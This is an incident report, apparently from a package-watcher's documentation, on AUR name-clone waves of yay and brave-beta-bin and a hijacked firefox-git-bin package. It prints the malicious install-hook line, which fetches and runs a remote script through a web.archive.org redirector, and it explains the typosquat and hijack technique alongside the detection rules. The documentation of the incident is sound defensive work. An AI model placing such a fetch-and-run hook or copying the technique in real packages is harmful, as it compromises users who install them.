<!-- description: The 2026-10-14 AUR name-clone waves: fifteen yay clones, fifteen brave-beta-bin clones, one of them a hijacked package, and what the watcher reported. -->
# 2026-10-14: AUR name-clone waves

On 2026-10-14 the watcher raised two clusters of newly-published AUR packages:

- fifteen created names built around `yay`, and
- fourteen created names around `brave-beta-bin` - a fifteenth package flagged in
  the same cluster, `firefox-git-bin`, was not a clone but a hijacked legitimate
  package (see below).

The created names were published under a maintainer account impersonating an
established one, each a near-miss spelling of a popular helper or browser
package - the kind of name a hurried `yay -S` completes from muscle memory.

## The delivery

The upstream recipe in each package was left byte-intact. The payload rode in a
committed `<pkg>.install` file that the recipe's `install=` line named, so the
malicious bytes sat in the one file a reader is least likely to open:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/...' 2>/dev/null)
```

The fetch is laundered through `web.archive.org`: a host the analysis trusts is
used as a redirector for a fresh origin, so the visible domain and the domain
that serves the script are not the same. The `<pkg>.install` bytes were
byte-identical across the clones in both waves.

## One hijack among the clones

`firefox-git-bin` did not follow the clone pattern. It was a long-standing,
legitimate package - its `PKGBUILD` is the real Mozilla-nightly recipe, with
Mozilla's release signing key and a clean history - and the recipe was left
untouched. The attacker took maintainership alongside the clones and appended
the same payload to its *existing* `firefox-git-bin.install`; the carrier is
byte-identical to the clones' (199 bytes, `sha256` `4b46e737…b75d`). It joined
the cluster through the adoption window, not through a spelling miss, which is
what the correlation layer is for. Because it is a real package that will be
cleaned up and restored, its name is deliberately *not* published as a `package`
indicator; the carrier `hash` covers it instead (see `data/iocs/README.md`).

## What fired, live

What the watcher actually put on the feed that day was the *correlation* layer,
not the payload: `G003` (one maintainer key adopting the batch), `H045` (mass
adoption) and `H052` (unrelated packages sharing a source repository or an
adoption window) named the cluster. The committed `.install` was real - but no
install-scriptlet rule fired on it in the live cycle, and the crossfire rule did
not exist yet. What raised the alarm was that fifteen names appeared at once
under one account, which is the whole point of the correlation layer: it does
not need to read the payload to see a wave.

Reproduced against the committed bytes today, the picture is broader. The
install-scriptlet rules claim the carrier - `H075` (an install hook that fetches
and runs foreign code), with the process-substitution shape `H090` and `C032` -
and the crossfire rule
[X034](../reference/rules/crossfire.md#x034) names the archival indirection
itself, so the *technique* is reported even where a payload rule caught the
bytes. **X034 was written after this incident**, from the pattern these two waves
left: the copy-pasted payload is exactly the case crossfire exists for, and the
fixtures under `tests/fixtures/malicious/campaign/` are those committed bytes,
scoring 100 under the current ruleset. The rule is a lesson the incident taught,
not a rule that caught it.

The same package-`hash` and a pinned archival URL are published as indicators in
`data/iocs/aur-typosquat-2026-10.json`, and a representative diff of each wave
is committed under `tests/fixtures/malicious/campaign/`. The indicators match
outside the score, as attribution, never as a number.

## What a flag here did and did not mean

- It meant a human should look at those packages before building them.
- It did **not** mean the packages were safe to ignore once the names were
  removed, nor that any specific machine was protected: the tool reports, the
  operator decides.
- It did **not** bound the campaign. Clustering is a heuristic over spelling and
  publishing metadata; a later wave that changed its letter substitutions, its
  timing, or its impersonated identity would read as new names again. The
  indicators and the rules raise the cost of the technique; they do not retire
  it.

The honest summary is the one the report itself gives: these packages were
flagged for review.
